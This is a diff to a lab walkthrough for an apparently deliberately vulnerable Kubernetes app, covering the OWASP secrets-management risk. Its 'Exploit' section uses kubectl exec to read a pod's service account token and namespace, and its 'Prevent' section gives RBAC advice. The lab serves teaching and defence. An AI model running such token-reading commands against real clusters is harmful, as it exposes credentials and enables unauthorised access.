@@ -21,14 +21,21 @@ type: Opaque
 
 # Exploit
 
+For better usecase goto [k03.hack1](../owasp-k8s-top-10-goat/k03.hack1.md)
+
 ## Kubernetes
 
 ```shell
-docker build -t ldynia/hackme-app:v1 -f devops/docker/v1.Dockerfile .
+docker build -t ldynia/hackme-app:v1 -f devops/docker/Dockerfile .
 docker push ldynia/hackme-app:v1
 
-kubectl apply -f devops/k8s/manifests/k08/hack1.pod.yaml
-kubectl exec hackme-app -- ls -l /var/run/secrets/kubernetes.io/serviceaccount
+cat devops/k8s/manifests/k08/hack.pod.yaml; echo
+kubectl apply -f devops/k8s/manifests/k08/hack.pod.yaml
+{
+  kubectl exec hackme-app -- ls -l /var/run/secrets/kubernetes.io/serviceaccount;
+  kubectl exec hackme-app -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace; echo;
+  kubectl exec hackme-app -- cat /var/run/secrets/kubernetes.io/serviceaccount/token; echo;
+}
 ```
 
 # Prevent
@@ -41,9 +48,7 @@ kubectl exec hackme-app -- ls -l /var/run/secrets/kubernetes.io/serviceaccount
 
     Configuration across clusters is predicament to security. Vulnerabilities, image security, and policy enforcement need to be in place.
     
-    
     Locked down RBAC configuration. Keep all Service Account and end user access to least privilege. 
-    
     
     Always audit the RBAC configuration of third-party plugins and software installed in the cluster to ensure access to Kubernetes secrets is not granted unnecessarily.
 
